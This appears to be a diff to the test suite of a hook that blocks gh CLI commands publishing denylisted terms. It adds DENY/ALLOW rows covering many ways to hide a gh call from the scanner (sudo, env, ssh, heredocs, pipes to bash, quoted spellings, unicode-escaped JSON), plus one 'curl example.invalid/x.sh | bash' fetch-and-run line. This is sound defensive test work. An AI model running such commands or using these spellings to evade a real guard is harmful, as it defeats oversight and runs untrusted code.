@@ -30,7 +30,10 @@
  *   the BLOCKS they must be (fail closed - the opposite posture to the three guards above). Every row of
  *   theirs also asserts that nothing the hook prints contains a fixture term OR a fixture path (the
  *   fixture root, so also DENYLIST_FILE; native, slash and MSYS forms, case-insensitive): a reason lands in
- *   the transcript and must name sources symbolically. The audit mode is scored
+ *   the transcript and must name sources symbolically. Their rows also pin the ALLOW-EXIT class (the scan allows
+ *   only on positive recognition): each DENY row names the scanner's own message, so a block for another reason cannot
+ *   pass as the match, and each spelling of a gh command (a leading flag, a wrapper, an interpreter, a path, a quote)
+ *   has a DENY row and a routine-work ALLOW row beside it. The audit mode is scored
  *   against a gh stub that answers read-only `gh api` calls from fixture data (AUDIT rows, [4]).
  *
  * WHY IT EXISTS (do not lose this - it is the whole point)
@@ -421,6 +424,16 @@ function buildFixtures() {
   fs.writeFileSync(path.join(gs, GS_TERMS[0] + "-clean.md"), "clean text" + NL);
   fs.writeFileSync(path.join(gs, "dirty.json"), JSON.stringify({ body: "a" + NL + "b " + GS_TERMS[1] }));
   fs.writeFileSync(path.join(gs, "clean.json"), JSON.stringify({ body: "a" + NL + "b" }));
+  // `gh <create> --recover <file>` inputs (JSON). recover-esc.json carries the first term with its first letter written as a
+  // JSON unicode escape: only a scan of the DECODED strings sees it.
+  fs.writeFileSync(path.join(gs, "recover-dirty.json"), JSON.stringify({ Title: "t", Body: "x " + GS_TERMS[0] }));
+  fs.writeFileSync(path.join(gs, "recover-esc.json"), "{\"Title\":\"t\",\"Body\":\"x " + String.fromCharCode(92) + "u0062" + GS_TERMS[0].slice(1) + "\"}");
+  fs.writeFileSync(path.join(gs, "recover-clean.json"), JSON.stringify({ Title: "t", Body: "all clean" }));
+  fs.writeFileSync(path.join(gs, "recover-bad.json"), "this is not json " + GS_TERMS[0]);
+  if (fs.readFileSync(path.join(gs, "recover-esc.json"), "utf8").toLowerCase().indexOf(GS_TERMS[0]) >= 0 ||
+      JSON.parse(fs.readFileSync(path.join(gs, "recover-esc.json"), "utf8")).Body.toLowerCase().indexOf(GS_TERMS[0]) < 0) {
+    throw new Error("recover-esc.json must hold the term only AFTER JSON decoding - the decoded-scan row would not discriminate");
+  }
   // By-construction check: a fixture file that did not hold its term would make every DENY row below
   // unable to fail for the reason under test.
   if (fs.readFileSync(path.join(gs, "dirty.md"), "utf8").toLowerCase().indexOf(GS_TERMS[0]) < 0 ||
@@ -1278,7 +1291,7 @@ gb("gb-d44", "DENY", "gh issue comment 5 --body ok",
   "timeout cannot start, exit 127, and the fallback must block with its fixed message", { prefix: "PATH=/no-such-dir; ", msg: "did not complete (exit 127)" });
 
 // gh aliases, read from the ALIASES section of `gh <group> <verb> --help` (issue/pr/release/repo `new`), and the
-// class rule: a verb the table does not know blocks when it carries one of the group's text flags.
+// class rule: a verb the table does not know BLOCKS (allow only on positive recognition; gb-d67 pins it without a text flag).
 gb("gb-d45", "DENY", "gh issue new -t x -b \"" + TA + "\"", "the `new` alias of issue create - fails if only the canonical verb is scanned", { msg: "gh issue create --body, line 1" });
 gb("gb-d46", "DENY", "gh pr new --title t --body \"" + TA + "\"", "the `new` alias of pr create", { msg: "gh pr create --body, line 1" });
 gb("gb-d47", "DENY", "gh release new v9.9.9 -n \"" + TA + "\"", "the `new` alias of release create", { msg: "gh release create --notes, line 1" });
@@ -1289,7 +1302,7 @@ gb("gb-d51", "DENY", "gh issue frobnicate 5 --body ok", "UNKNOWN verb with a tex
 gb("gb-d52", "DENY", "gh release frobnicate v1 -n \"" + TA + "\"", "unknown release verb, short text flag", { msg: "does not know" });
 gb("gb-d53", "DENY", "gh label frobnicate x --description y", "unknown label verb, long text flag", { msg: "does not know" });
 gb("gb-d54", "DENY", "gh repo frobnicate x -h y", "unknown repo verb, short text flag", { msg: "does not know" });
-gb("gb-d55", "DENY", "gh issue -R o/r create -b \"" + TA + "\"", "flags BEFORE the verb hide it from the table - fails if the flag is taken for the verb and the command passes", { msg: "does not know" });
+gb("gb-d55", "DENY", "gh issue -R o/r create -b \"" + TA + "\"", "flags BETWEEN the group and the verb: the verb is found past them and its text flags scanned - fails if the flag is taken for the verb and the command passes", { msg: "gh issue create --body, line 1" });
 gb("gb-d56", "DENY", "gh issue artifact create 5 --body-file x.md", "a nested verb that publishes text (issue artifact)", { msg: "does not know" });
 gb("gb-d57", "DENY", "gh issue frobnicate 5 -wb x", "a short-flag cluster ending in a text flag", { msg: "does not know" });
 // Short-flag CLUSTERS on KNOWN verbs (pflag: every letter is a flag, booleans chain, the first value-taking letter takes
@@ -1306,7 +1319,7 @@ gb("gb-d66", "DENY", "gh issue create -t sloop -w$X", "a cluster whose tail is a
 gp("gp-d15", "DENY", "gh pr create -dt '" + TA + "' -b 'sloop'", "the cluster walk on the PowerShell entry", { msg: "gh pr create --title, line 1" });
 gp("gp-d14", "DENY", "gh pr new --title 'x' --body '" + TA + "'", "the new alias on the PowerShell entry", { msg: "gh pr create --body, line 1" });
 
-gb("gb-a21", "ALLOW", "gh issue frobnicate 5", "an unknown verb WITHOUT a text flag may pass - fails if every unknown verb blocks");
+gb("gb-d67", "DENY", "gh issue frobnicate 5", "an unknown verb blocks even with NO text flag and no text at all (allow only on positive recognition) - fails if unrecognised verbs pass", { msg: "does not know" });
 gb("gb-a22", "ALLOW", "gh issue list -t '{{.title}}' --search " + TA, "a known read-only verb whose -t is a template, not text");
 gb("gb-a23", "ALLOW", "gh pr co 5", "the read-only alias pr co");
 gb("gb-a24", "ALLOW", "gh issue ls --search " + TA, "the read-only alias issue ls");
@@ -1322,7 +1335,7 @@ gb("gb-a31", "ALLOW", "gh pr create -dt ok -b ok -R o/" + TA, "a cluster in fron
 gb("gb-a32", "ALLOW", "gh api repos/o/r/issues -iq " + TA + " -f body=ok", "gh api: -q is a jq filter, not a published field");
 gb("gb-a01", "ALLOW", (x) => "gh issue comment 5 --body-file " + G(x, TA + "-clean.md"),
   "the hub's finding: a term only in a file PATH is not published - fails if the whole command line is scanned");
-gb("gb-a02", "ALLOW", "gh issue comment 5 --body ok --repo o/" + TA + " --label " + TA,
+gb("gb-a02", "ALLOW", "gh issue edit 5 --body ok --repo o/" + TA + " --add-label " + TA,
   "a term in non-text flags (a repo, a label) - fails if the command line is scanned");
 gb("gb-a03", "ALLOW", "gh issue list --search " + TA, "read-only gh with a term in it - fails if every gh call is scanned");
 gb("gb-a04", "ALLOW", "echo " + TA, "CONTROL - not gh at all; fails if the hook denies unconditionally");
@@ -1371,6 +1384,117 @@ gp("gp-a05", "ALLOW", "gh issue comment $n --body 'ok'", "a PowerShell variable 
 gp("gp-a06", "ALLOW", (x) => "Set-Content -Path " + G(x, "p2.md") + " -Value 'clean'; gh issue comment 5 --body-file " + G(x, "p2.md"),
   "a clean file written by Set-Content in the same command");
 gp("gp-a07", "ALLOW", "gh issue view 5", "read-only gh with no denylist", { dl: "missing" });
+
+// ---- Round 4: flags before the group, the allow-exit class, local files and alt text on covered verbs ----------------
+// cobra pairs a flag it does not know yet (`--x` without `=`, or exactly two characters) with the NEXT word, so gh runs
+// `gh -R o/r issue create -t t -b body`, and also `gh --body x issue comment 1`: flag words before the verb are judged
+// with the verb's own flags. ALLOW only on positive recognition: a command word after gh that no table places blocks.
+const BSL = String.fromCharCode(92);
+const GHEXE = '"C:' + BSL + 'Program Files' + BSL + 'GitHub CLI' + BSL + 'gh.exe"';
+gb("gb-d68", "DENY", "gh -R o/r issue create -t sloop -b \"" + TA + "\"", "a repo flag BEFORE the group: the old scan read -R's value as the group and allowed - fails if leading flags are skipped", { msg: "gh issue create --body, line 1" });
+gb("gb-d69", "DENY", "gh --repo o/r issue comment 1 -b \"" + TA + "\"", "the long form with a separate value", { msg: "gh issue comment --body, line 1" });
+gb("gb-d70", "DENY", "gh --repo=o/r pr create -t sloop -b \"" + TA + "\"", "the --repo=value form (already scanned before this round)", { msg: "gh pr create --body, line 1" });
+gb("gb-d71", "DENY", "gh --body \"" + TA + "\" issue comment 1", "a TEXT flag before the group: gh applies it to the verb - fails if only -R is understood in front", { msg: "gh issue comment --body, line 1" });
+gb("gb-d72", "DENY", "gh -b ok -t sloop issue create -R o/r --body-file " + "dirty.md", "leading text flags plus a body file after the verb", { msg: "--body-file (file contents), line 3" });
+gb("gb-d73", "DENY", "gh --frobnicate issue create -t sloop -b ok", "an UNKNOWN leading flag blocks even with clean text: cobra pairs it with `issue`, so `create` would be the command - which no table places", { msg: "a command this scan does not know" });
+gb("gb-d74", "DENY", "gh --frobnicate=1 issue create -t sloop -b ok", "an unknown leading flag in the --flag=value form (it swallows nothing): the leading-flag table rejects it", { msg: "flag before the verb that this scan does not know" });
+gb("gb-d123", "DENY", "gh -x y issue view 5", "an unknown two-character leading flag with a read-only verb behind it blocks too (allow only on positive recognition)", { msg: "flag before the verb that this scan does not know" });
+gb("gb-a33", "ALLOW", "gh -R o/r issue create -t sloop -b ok", "CONTROL - a clean call with a leading -R; fails if every leading flag blocks");
+gb("gb-a34", "ALLOW", "gh --repo o/" + TA + " pr view 5 --json body", "a read-only verb behind --repo with a term-bearing repo (not published text)");
+gb("gb-a35", "ALLOW", "gh --version", "gh's own flags with no command", { dl: "missing" });
+gb("gb-a36", "ALLOW", "gh issue --repo o/r view 5", "the repo flag between the group and a read-only verb");
+gp("gp-d16", "DENY", "gh -R o/r issue create -t sloop -b '" + TA + "'", "the leading-flag case on the PowerShell entry", { msg: "gh issue create --body, line 1" });
+gp("gp-d17", "DENY", "& " + GHEXE + " -R o/r issue comment 1 -b '" + TA + "'", "the call operator with a full gh.exe path and a leading flag", { msg: "gh issue comment --body, line 1" });
+gp("gp-a08", "ALLOW", "& " + GHEXE + " issue view 1", "the same call operator on a read-only verb");
+
+// The class: every spelling that puts a gh command somewhere other than the first word. Each DENY row carries a term in a body
+// (the scanner's own `--body, line 1` message pins that it was FOUND, not blocked for another reason).
+const BODYMSG = { msg: "--body, line 1" };
+gb("gb-d75", "DENY", "\"gh\" \"ISSUE\" \"Create\" -b " + TA, "the command and verb quoted, the verb in capitals", BODYMSG);
+gb("gb-d76", "DENY", "gh.exe issue create -b " + TA, "gh.exe", BODYMSG);
+gb("gb-d77", "DENY", "/usr/bin/gh issue create -b " + TA, "a full path to gh", BODYMSG);
+gb("gb-d78", "DENY", "command gh issue create -b " + TA, "behind `command`", BODYMSG);
+gb("gb-d79", "DENY", "env X=1 gh issue create -b " + TA, "behind env with an assignment", BODYMSG);
+gb("gb-d80", "DENY", "time gh issue create -b " + TA, "behind time", BODYMSG);
+gb("gb-d81", "DENY", "sudo -u me gh issue create -b " + TA, "behind sudo with a valued option", BODYMSG);
+gb("gb-d82", "DENY", "timeout 5 gh issue create -b " + TA, "behind timeout and its duration", BODYMSG);
+gb("gb-d83", "DENY", "echo 1 | xargs -I{} gh issue comment {} -b " + TA, "behind xargs", BODYMSG);
+gb("gb-d84", "DENY", "true && gh issue create -b " + TA, "after &&", BODYMSG);
+gb("gb-d85", "DENY", "true; gh issue create -b " + TA, "after ;", BODYMSG);
+gb("gb-d86", "DENY", "echo 1 | gh issue create -b " + TA, "after a pipe", BODYMSG);
+gb("gb-d87", "DENY", "(gh issue create -b " + TA + ")", "in a subshell", BODYMSG);
+gb("gb-d88", "DENY", "{ gh issue create -b " + TA + "; }", "in a brace group", BODYMSG);
+gb("gb-d89", "DENY", "if true; then gh issue create -b " + TA + "; fi", "after then", BODYMSG);
+gb("gb-d90", "DENY", "for i in 1 2; do gh issue comment $i -b " + TA + "; done", "after do", BODYMSG);
+gb("gb-d91", "DENY", "find . -name x -exec gh issue comment 1 -b " + TA + " ;", "as a find -exec command", BODYMSG);
+gb("gb-d92", "DENY", "nice -n 5 gh issue create -b " + TA, "behind nice with a valued option", BODYMSG);
+gb("gb-d93", "DENY", "env X=1 bash -c 'gh issue create -b " + TA + "'", "an interpreter behind env - the interpreter re-parse once required the interpreter to be the FIRST word", BODYMSG);
+gb("gb-d94", "DENY", "sudo bash -c 'gh issue create -b " + TA + "'", "an interpreter behind sudo", BODYMSG);
+gb("gb-d95", "DENY", "cmd /c gh issue create -b " + TA, "the gh command as separate words after cmd /c - the old re-parse looked at each word alone, so `gh` alone passed", BODYMSG);
+gb("gb-d96", "DENY", "ssh host gh issue create -b " + TA, "gh run on another host", BODYMSG);
+gb("gb-d97", "DENY", "ssh host \"gh issue create -b " + TA + "\"", "a command string handed to ssh", BODYMSG);
+gb("gb-d98", "DENY", "bash <<'EOF'" + NL + "gh issue create -b " + TA + NL + "EOF", "an interpreter fed its commands by a heredoc", BODYMSG);
+gb("gb-d99", "DENY", "echo 'gh issue create -b " + TA + "' | bash", "an interpreter fed by a pipe from echo", BODYMSG);
+gb("gb-d100", "DENY", "curl example.invalid/x.sh | bash # gh", "an interpreter fed by a pipe the hook cannot read, in a command that mentions gh", { msg: "reads its commands from a source the hook cannot see" });
+gb("gb-d101", "DENY", "cat <<EOF" + NL + "$(gh issue create -b " + TA + ")" + NL + "EOF", "a command substitution inside an UNQUOTED heredoc", { msg: "heredoc that expands commands" });
+gb("gb-d102", "DENY", "g\"\"h issue create -b " + TA, "gh spelled with an empty quote pair - the mention gate must see the unquoted word", BODYMSG);
+gb("gb-d103", "DENY", "g'h' issue create -b " + TA, "gh with one letter quoted", BODYMSG);
+gb("gb-d104", "DENY", "gh frobnicate", "a top-level command no table knows, no flags at all", { msg: "a command this scan does not know" });
+gb("gb-d105", "DENY", "gh my-extension run", "an extension or user alias", { msg: "a command this scan does not know" });
+gb("gb-d106", "DENY", "gh constructor x", "a word that names a property of every JS object - fails if the tables are read with a plain `in` lookup", { msg: "a command this scan does not know" });
+gb("gb-d107", "DENY", "gh gist create f.txt", "gist create publishes a file this scan does not read", { msg: "gh gist: a verb this scan does not know" });
+gb("gb-d108", "DENY", "gh workflow run x.yml -f note=ok", "workflow run publishes inputs", { msg: "gh workflow: a verb this scan does not know" });
+gb("gb-d109", "DENY", "gh extension exec foo", "extension exec runs anything", { msg: "gh extension: a verb this scan does not know" });
+gb("gb-d110", "DENY", "gh repo autolink create AB https://example.invalid/<num>", "a sub-group verb that publishes a URL template", { msg: "gh repo autolink: a verb this scan does not know" });
+gb("gb-d111", "DENY", "gh issue create --newflag ok -t x -b ok", "a long flag the covered verb's table does not list (it could be a text flag of a newer gh)", { msg: "a long flag this scan does not know" });
+gb("gb-d112", "DENY", "gh issue create -b ok $(echo x)", "an unquoted command substitution among the flags cannot be judged", { msg: "unquoted expansion" });
+gp("gp-d18", "DENY", "Start-Process gh -ArgumentList 'issue create -b " + TA + "'", "Start-Process: the argument string is one word, which no table places as a command", { msg: "a command this scan does not know" });
+gp("gp-d19", "DENY", "iex \"gh issue create -b '" + TA + "'\"", "Invoke-Expression of a gh command string", BODYMSG);
+gp("gp-d20", "DENY", "$u = gh issue create -t x -b '" + TA + "'", "an assignment from a gh call (the first word is a variable)", BODYMSG);
+gp("gp-d21", "DENY", "if (Test-Path x) { gh issue create -b '" + TA + "' }", "gh inside a script block after a keyword", BODYMSG);
+gp("gp-d22", "DENY", "gh frobnicate", "an unknown top-level command on the PowerShell entry", { msg: "a command this scan does not know" });
+gp("gp-d23", "DENY", "& " + GHEXE + " frobnicate", "the call operator with a full path and an unknown command", { msg: "a command this scan does not know" });
+
+gb("gb-a37", "ALLOW", "command -v gh >/dev/null && echo yes", "a lookup of gh itself (no command word follows it)");
+gb("gb-a38", "ALLOW", "which gh", "gh as the argument of which");
+gb("gb-a39", "ALLOW", "grep -rn gh docs/", "gh as a grep pattern followed by a path - the loose rule needs a gh command word after it", { dl: "missing" });
+gb("gb-a40", "ALLOW", "git log --oneline -n 3 -- plugins/gh", "a path ending in gh", { dl: "missing" });
+gb("gb-a41", "ALLOW", "gh auth status", "a recognised no-text command (any verb)", { dl: "missing" });
+gb("gb-a42", "ALLOW", "gh run list --limit 3 && gh run view 5 --log", "workflow runs, read-only", { dl: "missing" });
+gb("gb-a43", "ALLOW", "gh workflow list", "a recognised no-text verb of a partially covered command", { dl: "missing" });
+gb("gb-a44", "ALLOW", "gh search issues sloop --repo o/r", "search", { dl: "missing" });
+gb("gb-a45", "ALLOW", "gh status", "status", { dl: "missing" });
+gb("gb-a46", "ALLOW", "gh issue artifact list 5", "a read-only sub-group verb", { dl: "missing" });
+gb("gb-a47", "ALLOW", "gh extension list", "extension list", { dl: "missing" });
+gb("gb-a48", "ALLOW", "gh api repos/o/r/pulls/5 --jq .title", "a read-only api call", { dl: "missing" });
+gb("gb-a49", "ALLOW", "node scripts/denylist-scan.js --help # gh", "a command that merely mentions gh in a comment", { dl: "missing" });
+gb("gb-a50", "ALLOW", "git push && gh pr create --fill", "a fill-only create (text comes from commits the push already published)");
+gp("gp-a09", "ALLOW", "Get-Command gh -ErrorAction SilentlyContinue", "a PowerShell lookup of gh");
+gp("gp-a10", "ALLOW", "gh run list; gh pr checks 5", "read-only gh commands in sequence", { dl: "missing" });
+
+// Local files and alt text on covered verbs. pr create -T/--template is a FILE (starting body text); issue create -T/--template
+// is a template NAME looked up in the repo's committed templates (so nothing is read). --attach publishes the alt text after `#`
+// (the attached file's bytes are out of scope); --recover is gh's saved JSON input of a failed create.
+gb("gb-d113", "DENY", (x) => "gh pr create -t x -b ok -T " + G(x, "dirty.md"), "a pr create template FILE is scanned like a body file", { msg: "--template (file contents), line 3" });
+gb("gb-d114", "DENY", (x) => "gh pr create -t x -b ok --template=" + G(x, "dirty.md"), "the --template=file form", { msg: "--template (file contents), line 3" });
+gb("gb-d115", "DENY", (x) => "gh pr create -t x -b ok -T " + G(x, "no-such-file.md"), "an unreadable template file blocks", { msg: "unreadable" });
+gb("gb-d116", "DENY", (x) => "gh issue create -t x -b ok --recover " + G(x, "recover-dirty.json"), "a recover file holding the term (raw scan)", { msg: "--recover (file contents), line 1" });
+gb("gb-d117", "DENY", (x) => "gh pr create -t x -b ok --recover " + G(x, "recover-dirty.json"), "the same on pr create", { msg: "--recover (file contents), line 1" });
+gb("gb-d118", "DENY", (x) => "gh issue create -t x -b ok --recover " + G(x, "recover-esc.json"), "a term split by a JSON unicode escape: only the decoded strings show it - fails if only the raw file is scanned", { msg: "--recover (decoded), line " });
+gb("gb-d119", "DENY", (x) => "gh issue create -t x -b ok --recover " + G(x, "recover-bad.json"), "a recover file that is not JSON cannot be read reliably, so it blocks", { msg: "not JSON" });
+gb("gb-d120", "DENY", "gh issue create -t x -b ok --attach './p.png#alt " + TA + "'", "alt text after # is published", { msg: "--attach (alt text), line 1" });
+gb("gb-d121", "DENY", "gh pr comment 1 -b ok --attach ./a.png#" + TA, "alt text on pr comment", { msg: "--attach (alt text), line 1" });
+gb("gb-d122", "DENY", "gh issue edit 1 --attach ./a.png#" + TA, "alt text on issue edit", { msg: "--attach (alt text), line 1" });
+gb("gb-a51", "ALLOW", (x) => "gh pr create -t x -b ok -T " + G(x, "clean.md"), "a clean template file");
+gb("gb-a52", "ALLOW", "gh issue create -t x -b ok -T " + TA, "issue create -T is a template NAME (a repo-committed file, scanned by pre-push), never read here - fails if the name is scanned as text");
+gb("gb-a53", "ALLOW", (x) => "gh issue create -t x -b ok --recover " + G(x, "recover-clean.json"), "a clean recover file");
+gb("gb-a54", "ALLOW", "gh issue create -t x -b ok --attach './" + TA + ".png'", "a term only in the attached file's PATH (no # alt text): paths are never scanned");
+gb("gb-a55", "ALLOW", "gh issue create -t x -b ok --attach './a.png#clean alt'", "clean alt text");
+gb("gb-a56", "ALLOW", "gh pr create --fill-first --draft", "--fill-first: the text comes from commits the push already published");
+gb("gb-a57", "ALLOW", "gh pr create --fill-verbose -w", "--fill-verbose and -w (a browser form the hook cannot see)");
+gb("gb-a58", "ALLOW", "gh pr create -e", "-e: an interactive editor the hook cannot see");
+gb("gb-a59", "ALLOW", "gh release create v1 --generate-notes", "--generate-notes: GitHub builds the notes from merged PRs");
+gb("gb-a60", "ALLOW", "gh release create v1 --notes-from-tag -t ok", "--notes-from-tag: the tag message was pushed with the tag");
 
 // ---------------------------------------------------------------------------------------------
 // [5] Execution - bash -c is the production path, and the only authoritative one
